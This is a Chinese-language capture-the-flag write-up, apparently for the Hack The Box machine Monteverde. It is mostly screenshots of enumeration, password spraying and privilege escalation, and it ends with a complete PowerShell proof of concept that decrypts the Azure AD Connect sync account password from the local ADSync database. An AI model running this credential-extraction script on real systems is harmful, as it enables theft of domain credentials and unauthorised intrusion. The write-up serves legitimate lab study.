+++
ShowToc = true
TocOpen = true
title = '0X025 monteverde'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'HTB'
+++



# 端口扫描

![](/htb_img/WEBRESOURCE4426b40786740c7305d93ea06e382c93image.png)

![](/htb_img/WEBRESOURCE0370475fd82030fafde08a613842492dimage.png)

![](/htb_img/WEBRESOURCE232cda4a25eed1d4e8da0fa0dc53bfb1image.png)

# 获取立足点

值得关注的端口：445、389、5985

445没有：

![](/htb_img/WEBRESOURCE7afb4bd7f5c08207390677f10b9e8063image.png)

389可以列出用户名：

但是AS-REP Roasting失败：

![](/htb_img/WEBRESOURCEf114d779bca9d8081ca239ac0ad179c9image.png)

那就只能破解试试了：

发现没有锁定策略：

![](/htb_img/WEBRESOURCE49b27ff43cafb6269200e46970c1cdfeimage.png)

经过尝试：

账户名即使密码：

![](/htb_img/WEBRESOURCE105e0d41c91897f7ce7d0554fd87e44aimage.png)

![](/htb_img/WEBRESOURCEe709208fcb6e72c01b8a4d7635afbb5eimage.png)

发现内容：

![](/htb_img/WEBRESOURCEdc8de8f23b84b70e406352ad856bbb41image.png)

密码喷洒：

![](/htb_img/WEBRESOURCE7f024ac9675ca06bcd8eba13e1a56e8eimage.png)

拿到flag:

![](/htb_img/WEBRESOURCE9ee4435ce06c2160a6922134155a562eimage.png)

# 提权

bloodhound

简单解读一下，就是本地提权，或者寻找其他路径：

![](/htb_img/WEBRESOURCEe4cf0162cd4e7cf6da9b86703cce2961image.png)

winpeass:

感觉这个有机会，应为和这个组的权限好像有关系：

![](/htb_img/WEBRESOURCE65d209b7e589d06fcd76176d689c1a16image.png)

看一下软件安装情况，可以发现这些软件：

![](/htb_img/WEBRESOURCEe30dd0a310c0f7457d77fbae05e3a93dimage.png)

后面的内容属实不会了，无奈看了wp:

最后修改的poc:

```
Function Get-ADConnectPassword{
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
$key_id = 1
$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name ='Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
}
```

![](/htb_img/WEBRESOURCEb5d2e0593c0820d808addcfcde8e712cimage.png)

![](/htb_img/WEBRESOURCEb805b08f3067c176e31022a18266eab4image.png)